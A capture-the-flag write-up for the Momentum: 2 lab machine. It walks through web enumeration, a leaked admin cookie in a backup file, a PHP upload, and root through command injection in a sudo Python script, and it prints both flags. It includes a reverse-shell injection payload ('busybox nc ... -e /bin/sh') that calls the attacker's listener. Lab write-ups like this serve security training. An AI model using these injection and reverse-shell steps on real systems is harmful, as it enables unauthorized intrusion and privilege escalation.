# Momentum: 2 Writeup
# Description
```bash
Difficulty : medium
Keywords : curl, bash, code review
This works better with VirtualBox rather than VMware
```
# Exploitation
Let's start with a network scan
```bash
Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                    
                                                                                                                                                                                                                  
 5 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 300                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.104   40:65:d4:5e:e0:3e      2     120  Unknown vendor                                                                                                                                                 
 192.168.0.116   08:00:27:9a:18:5d      1      60  PCS Systemtechnik GmbH                                                                                                                                         
 192.168.0.102   d8:80:83:cf:7a:77      1      60  CLOUD NETWORK TECHNOLOGY SINGAPORE PTE. LTD.                                                                                                                   
 192.168.0.1     f0:a7:31:e9:bb:f8      1      60  TP-Link Systems Inc
```
\
Next, Open ports
```bash
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```
\
Accessing Port 80 on browser gives us
\
<img width="1475" height="594" alt="image" src="https://github.com/user-attachments/assets/748462d9-0180-4bbc-862a-72729c5f5cb8" />
\
Next, lets run dirb
```bash
dirb http://192.168.0.116/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Feb 19 14:10:16 2026
URL_BASE: http://192.168.0.116/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.0.116/ ----
==> DIRECTORY: http://192.168.0.116/css/                                                                                                                                                                          
==> DIRECTORY: http://192.168.0.116/img/                                                                                                                                                                          
+ http://192.168.0.116/index.html (CODE:200|SIZE:1428)                                                                                                                                                            
==> DIRECTORY: http://192.168.0.116/js/                                                                                                                                                                           
==> DIRECTORY: http://192.168.0.116/manual/                                                                                                                                                                       
+ http://192.168.0.116/server-status (CODE:403|SIZE:278) 
```
\
We find a main.js file containing interesting information
\
<img width="567" height="611" alt="image" src="https://github.com/user-attachments/assets/090b89dc-ec45-4de4-9b25-b8ccb5c7ef23" />
\
And from dirsearch we also found dashboard.html
```bash
dirsearch -u http://192.168.0.116/   
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/cysec/vulnhub/momentum/1/reports/http_192.168.0.116/__26-02-19_14-16-24.txt

Target: http://192.168.0.116/

[14:16:24] Starting: 
[14:16:24] 301 -  311B  - /js  ->  http://192.168.0.116/js/                 
[14:16:25] 403 -  278B  - /.ht_wsr.txt                                      
[14:16:25] 403 -  278B  - /.htaccess.bak1                                   
[14:16:25] 403 -  278B  - /.htaccess.sample                                 
[14:16:25] 403 -  278B  - /.htaccess.orig
[14:16:25] 403 -  278B  - /.htaccess_extra                                  
[14:16:25] 403 -  278B  - /.htaccess_orig
[14:16:25] 403 -  278B  - /.htaccess_sc
[14:16:25] 403 -  278B  - /.htaccessBAK
[14:16:25] 403 -  278B  - /.htaccessOLD
[14:16:25] 403 -  278B  - /.htaccessOLD2
[14:16:25] 403 -  278B  - /.htm                                             
[14:16:25] 403 -  278B  - /.html
[14:16:25] 403 -  278B  - /.htpasswd_test                                   
[14:16:25] 403 -  278B  - /.htpasswds
[14:16:25] 403 -  278B  - /.httr-oauth
[14:16:26] 403 -  278B  - /.php                                             
[14:16:27] 403 -  278B  - /.htaccess.save                                   
[14:16:32] 200 -    0B  - /ajax.php                                         
[14:16:36] 301 -  312B  - /css  ->  http://192.168.0.116/css/               
[14:16:36] 200 -  296B  - /dashboard.html                                   
[14:16:40] 301 -  312B  - /img  ->  http://192.168.0.116/img/               
[14:16:42] 200 -  454B  - /js/                                              
[14:16:43] 301 -  315B  - /manual  ->  http://192.168.0.116/manual/         
[14:16:43] 200 -  201B  - /manual/index.html
[14:16:50] 403 -  278B  - /server-status                                    
[14:16:50] 403 -  278B  - /server-status/
                                                                             
Task Completed
```
\
<img width="1367" height="426" alt="image" src="https://github.com/user-attachments/assets/d684dbd8-83fb-48af-9985-e4d7d20da489" />
\
Its the same file upload functionality , so itried uploading some files with different extesnions , but it was accepting only ".txt" files as far as i checked , so i decide and go back and try enumerating again.
```bash
gobuster dir -t 100 -u http://192.168.0.116/  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,html,php,php.bak -r
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.116/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,html,php,php.bak
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1428]
/img                  (Status: 200) [Size: 1306]
/css                  (Status: 200) [Size: 932]
/ajax.php             (Status: 200) [Size: 0]
/ajax.php.bak         (Status: 200) [Size: 357]
/manual               (Status: 200) [Size: 626]
/js                   (Status: 200) [Size: 929]
/dashboard.html       (Status: 200) [Size: 513]
/owls                 (Status: 200) [Size: 1134]
/server-status        (Status: 403) [Size: 278]
```
\
This time i used gobuster with extensions and found more interesting things like "/ajax.php.bak,/owls"
\
<img width="437" height="298" alt="image" src="https://github.com/user-attachments/assets/a05c962c-b6f8-4811-a573-a91361cbd719" />
\
"/owls" basically had the uploaded files i tested.
\
And checking the backup file
```bash
 cat ajax.php.bak 
   
   
    //The boss told me to add one more Upper Case letter at the end of the cookie
   if(isset($_COOKIE['admin']) && $_COOKIE['admin'] == '&G6u@B6uDXMq&Ms'){

       //[+] Add if $_POST['secure'] == 'val1d'
        $valid_ext = array("pdf","php","txt");
   }
   else{

        $valid_ext = array("txt");
   }

   // Remember success upload returns 1
```
\
So form this we can tell that we can upload php files , only when this condition is met , so i use a cookie editor extension 
\
<img width="509" height="339" alt="image" src="https://github.com/user-attachments/assets/792a55b1-b0e1-4114-a5a7-f21d20d96bcf" />
\
And i intercepted the request and added the body parameter "secure" with "val1d" , but still file was not uploading , then i realized maybe we have to find the last CApital letter in the cookie.
\
So i send to burp intruder and run a iterator
\
<img width="1570" height="649" alt="image" src="https://github.com/user-attachments/assets/9ded8cbe-7782-4def-b485-c9ddb619e441" />
\
When we check the responses , only the one with letter "R" gets a response of "1"
\
<img width="1025" height="386" alt="image" src="https://github.com/user-attachments/assets/5db411ec-a91e-470b-9048-d15e50e80374" />
\
So , lets access the file and get our rev shell , since it is already uploaded
```bash
penelope                  
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.0.111
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from momentum2~192.168.0.116-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/momentum2~192.168.0.116-Linux-x86_64/2026_02_19-14_37_18-538.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@momentum2:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
\
We check for users with bash permissions 
```bash
www-data@momentum2:/var/www/html$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
athena:x:1000:1000:athena,,,:/home/athena:/bin/bash
```
\
There is a user "athena" , so lets check their home directory
```bash
www-data@momentum2:/home/athena$ ls -la
total 32
drwxr-xr-x 3 athena athena 4096 May 27  2021 .
drwxr-xr-x 4 root   root   4096 May 27  2021 ..
-rw-r--r-- 1 athena athena  220 May 25  2021 .bash_logout
-rw-r--r-- 1 athena athena 3526 May 25  2021 .bashrc
drwxr-xr-x 3 athena athena 4096 May 27  2021 .local
-rw-r--r-- 1 athena athena  807 May 25  2021 .profile
-rw-r--r-- 1 athena athena   37 May 27  2021 password-reminder.txt
-rw-r--r-- 1 root   root    241 May 27  2021 user.txt
www-data@momentum2:/home/athena$ cat user.txt 
/                         \
~ Momentum 2 ~ User Owned ~
\                         /

---------------------------------------------------
FLAG : 4WpJT9qXoQwFGeoRoFBEJZiM2j2Ad33gWipzZkStMLHw
---------------------------------------------------
www-data@momentum2:/home/athena$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@momentum2:/home/athena$ cat password-reminder.txt 
password : myvulnerableapp[Asterisk]
www-data@momentum2:/home/athena$ su athena
Password: 
athena@momentum2:~$ id
uid=1000(athena) gid=1000(athena) groups=1000(athena),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
```
\
They just gave away their password , so now onto privilege escalation
\
Now checking sudo permissions of athena
```bash
athena@momentum2:~$ sudo -l
Matching Defaults entries for athena on momentum2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User athena may run the following commands on momentum2:
    (root) NOPASSWD: /usr/bin/python3 /home/team-tasks/cookie-gen.py
athena@momentum2:~$ ls -la /home/team-tasks/cookie-gen.py
-rw-r--r-- 1 root root 402 May 27  2021 /home/team-tasks/cookie-gen.py
athena@momentum2:~$ cat /home/team-tasks/cookie-gen.py
import random
import os
import subprocess

print('~ Random Cookie Generation ~')
print('[!] for security reasons we keep logs about cookie seeds.')
chars = '@#$ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh'

seed = input("Enter the seed : ")
random.seed = seed

cookie = ''
for c in range(20):
    cookie += random.choice(chars)

print(cookie)

cmd = "echo %s >> log.txt" % seed
subprocess.Popen(cmd, shell=True)
```
\
So , from this python script , the only thing we can control is the user provided input which is executed 
```bash
cmd = "echo %s >> log.txt" % seed
subprocess.Popen(cmd, shell=True)
```
\
Since we deal with many "echo" command injections , i thought of trying command injection here
\
So i tried mutiple payloads and this one seemed to work
```bash
athena@momentum2:/tmp$ sudo -u root /usr/bin/python3 /home/team-tasks/cookie-gen.py
~ Random Cookie Generation ~
[!] for security reasons we keep logs about cookie seeds.
Enter the seed : 0|`id`
fGPDdTWEDARUU$IfKV$H
athena@momentum2:/tmp$ /bin/sh: 1: uid=0(root): not found
^C
```
\
Here we see that the output is given on the terminal itself "1: uid=0(root)" 
\
So i decide to just use a 1 liner rev shell payload to get a root shell 
```bash
athena@momentum2:/tmp$ sudo -u root /usr/bin/python3 /home/team-tasks/cookie-gen.py
~ Random Cookie Generation ~
[!] for security reasons we keep logs about cookie seeds.
Enter the seed : 0|`busybox nc 192.168.0.111 4445 -e /bin/sh`
c$HDb#ITLEeHVMHhbGPX
```
```bash
penelope -p 4445          
[+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 192.168.0.111
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from momentum2~192.168.0.116-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/momentum2~192.168.0.116-Linux-x86_64/2026_02_19-14_49_28-414.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@momentum2:/tmp# cd /root
root@momentum2:~# ls -la
total 32
drwx------  4 root root 4096 May 27  2021 .
drwxr-xr-x 18 root root 4096 May 25  2021 ..
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 May 25  2021 .config
drwxr-xr-x  3 root root 4096 May 27  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root  253 May 27  2021 root.txt
-rw-r--r--  1 root root  227 May 25  2021 .wget-hsts
root@momentum2:~# cat root.txt 
//                    \\
}  Rooted - Momentum 2 {
\\                    //

---------------------------------------------------
FLAG : 4bRQL7jaiFqK45dVjC2XP4TzfKizgGHTMYJfSrPEkezG
---------------------------------------------------


by Alienum with <3
```
\
The end , thank you for reading till here
